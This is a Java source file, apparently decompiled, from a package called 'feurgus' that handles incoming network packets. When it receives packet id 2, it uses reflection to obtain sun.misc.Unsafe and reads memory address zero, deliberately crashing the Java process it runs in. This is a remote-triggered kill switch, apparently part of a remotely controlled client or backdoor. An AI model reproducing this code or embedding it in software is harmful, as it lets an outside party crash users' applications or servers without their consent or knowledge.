package fr.yannox.feurgus.connection.packets.in;

import fr.yannox.feurgus.connection.packets.in.PacketIn;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import sun.misc.Unsafe;

public class PacketInCrash
extends PacketIn {
    @Override
    public int getPacketId() {
        return 2;
    }

    @Override
    public void fromBytes(byte[] bytes) {
        this.crash();
    }

    public void crash() {
        long pid = this.getProcessId();
        if (pid == -1L) {
            return;
        }
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field f1 = unsafeClass.getDeclaredField("theUnsafe");
            f1.setAccessible(true);
            Unsafe unsafe = (Unsafe)f1.get(null);
            unsafe.getByte(0L);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private long getProcessId() {
        String jvmName = ManagementFactory.getRuntimeMXBean().getName();
        int index = jvmName.indexOf(64);
        if (index < 1) {
            return -1L;
        }
        try {
            return Long.parseLong(jvmName.substring(0, index));
        }
        catch (NumberFormatException numberFormatException) {
            return -1L;
        }
    }
}
